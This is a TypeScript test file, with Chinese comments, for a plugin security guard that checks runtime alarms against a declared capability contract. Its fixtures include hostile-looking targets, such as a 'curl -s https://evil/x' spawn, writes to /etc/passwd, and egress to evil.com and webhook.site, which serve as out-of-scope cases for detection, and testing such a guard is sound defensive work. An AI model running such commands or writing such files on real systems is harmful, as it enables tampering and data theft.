import { describe, expect, it, beforeEach } from 'vitest'
import { VetStatus } from '../lib/guard/status.js'
import { createT2Sink, type ContractResolver } from '../lib/guard/runtime-sink.js'
import { contractFieldOf, checkAlarmInContract, type Contract } from '../lib/guard/contract.js'
import { capabilityDiff, type CapabilityManifest as _CM } from '../lib/guard/capability-diff.js'

function contract(over?: { connect?: string[]; ports?: number[]; read?: string[]; write?: string[]; commands?: string[] }): Contract {
  return {
    schema: 1,
    name: '@x/demo',
    scope: {
      fs: { read: over?.read ?? ['/home/u/data/**'], write: over?.write ?? ['/home/u/data/**'], destroy: [] },
      network: { connect: over?.connect ?? ['trust.example.com'], ports: over?.ports ?? [443] },
      spawn: { commands: over?.commands ?? ['git'] },
      env: ['VET_EXAMPLE'],
    },
  }
}

const demoManifest: _CM = { hosts: [], fsPaths: [], spawnCmds: [], imports: [], hasNetwork: false, hasExec: false }

describe('contractFieldOf：报警 kind → 契约字段', () => {
  it('映射表', () => {
    expect(contractFieldOf('fs-read')).toBe('fs-read')
    expect(contractFieldOf('fs-probe')).toBe('fs-read')
    expect(contractFieldOf('fs-write')).toBe('fs-write')
    expect(contractFieldOf('persistence-write')).toBe('fs-write')
    expect(contractFieldOf('install-write')).toBe('fs-write')
    expect(contractFieldOf('fs-destroy')).toBe('fs-destroy')
    expect(contractFieldOf('integrity')).toBe('fs-destroy')
    expect(contractFieldOf('net-egress')).toBe('network')
    expect(contractFieldOf('spawn')).toBe('spawn')
    expect(contractFieldOf('n3-ransom')).toBeNull()
    expect(contractFieldOf('canary-leak')).toBeNull()
  })
})

describe('checkAlarmInContract：单个报警对账', () => {
  const c = contract()
  it('fs 在范围内 / 范围外', () => {
    expect(checkAlarmInContract('fs-read', '/home/u/data/x.json', c)).toEqual({ field: 'fs-read', within: true })
    expect(checkAlarmInContract('fs-write', '/etc/passwd', c)).toEqual({ field: 'fs-write', within: false })
    expect(checkAlarmInContract('fs-destroy', '/home/u/data/x', c)).toEqual({ field: 'fs-destroy', within: false })
  })
  it('网络：主机 + 端口白名单', () => {
    expect(checkAlarmInContract('net-egress', 'trust.example.com', c)).toEqual({ field: 'network', within: true })
    expect(checkAlarmInContract('net-egress', 'trust.example.com:443', c)).toEqual({ field: 'network', within: true })
    expect(checkAlarmInContract('net-egress', 'trust.example.com:8080', c)).toEqual({ field: 'network', within: false })
    expect(checkAlarmInContract('net-egress', 'webhook.site', c)).toEqual({ field: 'network', within: false })
  })
  it('spawn 在范围内 / 范围外', () => {
    expect(checkAlarmInContract('spawn', 'git clone x', c)).toEqual({ field: 'spawn', within: true })
    expect(checkAlarmInContract('spawn', 'curl -s https://evil/x', c)).toEqual({ field: 'spawn', within: false })
  })
  it('不可映射 kind 或无 target → null（不产生 m1 记录）', () => {
    expect(checkAlarmInContract('n3-ransom', '/x', c)).toBeNull()
    expect(checkAlarmInContract('fs-read', undefined, c)).toBeNull()
  })
})

describe('sink 接线（createT2Sink + 契约解析器）', () => {
  let status: VetStatus
  let resolver: ContractResolver
  beforeEach(() => {
    status = new VetStatus()
    resolver = () => ({ kind: 'loaded', contract: contract() })
  })
  const alarms = () => status.snapshot().alarms

  it('契约在范围内 → 只记原报警，无 m1 记录（零噪音）', () => {
    createT2Sink(status, resolver).sink({ severity: 'yellow', kind: 'fs-read', message: '读', target: '/home/u/data/a.json', pluginHint: '@x/demo' })
    const a = alarms()
    expect(a.some(x => x.kind === 'fs-read')).toBe(true)
    expect(a.some(x => x.kind.startsWith('m1-contract'))).toBe(false)
  })

  it('契约越界 → info m1:contract-violation（带归因与合并键，重复合并累计）', () => {
    const { sink } = createT2Sink(status, resolver)
    sink({ severity: 'yellow', kind: 'fs-write', message: '写 /etc/passwd', target: '/etc/passwd', pluginHint: '@x/demo' })
    sink({ severity: 'yellow', kind: 'fs-write', message: '写 /etc/hosts', target: '/etc/hosts', pluginHint: '@x/demo' })
    const v = alarms().filter(x => x.kind === 'm1-contract-violation')
    expect(v).toHaveLength(1)
    expect(v[0].severity).toBe('info')
    expect(v[0].pluginHint).toBe('@x/demo')
    expect(v[0].count).toBe(2) // (source,kind,plugin,field) 合并去重累计
    expect(v[0].target).toBe('/etc/hosts') // 保留最新 target
  })

  it('拒载 → yellow m1:contract-rejected 只记一次（多条报警不刷屏）', () => {
    let resolverRejected: ContractResolver = () => ({ kind: 'rejected' })
    const { sink } = createT2Sink(status, resolverRejected)
    sink({ severity: 'yellow', kind: 'fs-write', message: '写', target: '/etc/passwd', pluginHint: '@x/demo' })
    sink({ severity: 'yellow', kind: 'net-egress', message: '联', target: 'evil.com', pluginHint: '@x/demo' })
    const r = alarms().filter(x => x.kind === 'm1-contract-rejected')
    expect(r).toHaveLength(1)
    expect(r[0].severity).toBe('yellow')
  })

  it('无契约解析器 → 完全零 m1 记录（老路径默认）', () => {
    createT2Sink(status).sink({ severity: 'yellow', kind: 'fs-write', message: '写', target: '/etc/passwd', pluginHint: '@x/demo' })
    expect(alarms().some(x => x.kind.startsWith('m1-contract'))).toBe(false)
  })

  it('代码事实证伪契约 → yellow m1:contract-distrusted（只记一次）；契约压不过代码事实', () => {
    capabilityDiff.registerStatic('@x/demo', demoManifest)
    const { sink } = createT2Sink(status, resolver)
    sink({ severity: 'yellow', kind: 'fs-write', message: '写 /etc/passwd', target: '/etc/passwd', pluginHint: '@x/demo' })
    sink({ severity: 'yellow', kind: 'net-egress', message: '联 evil', target: 'evil.example.net', pluginHint: '@x/demo' })
    // fs-write 触发 n1-hidden（red）+ distrusted（yellow）；net-egress 触发 n1-hidden（red）但 distrusted 只一次
    const d = alarms().filter(x => x.kind === 'm1-contract-distrusted')
    expect(d).toHaveLength(1)
    expect(d[0].severity).toBe('yellow')
    expect(alarms().filter(x => x.kind === 'n1-hidden').length).toBeGreaterThan(0)
    capabilityDiff.registerStatic('@x/demo', undefined)
  })
})
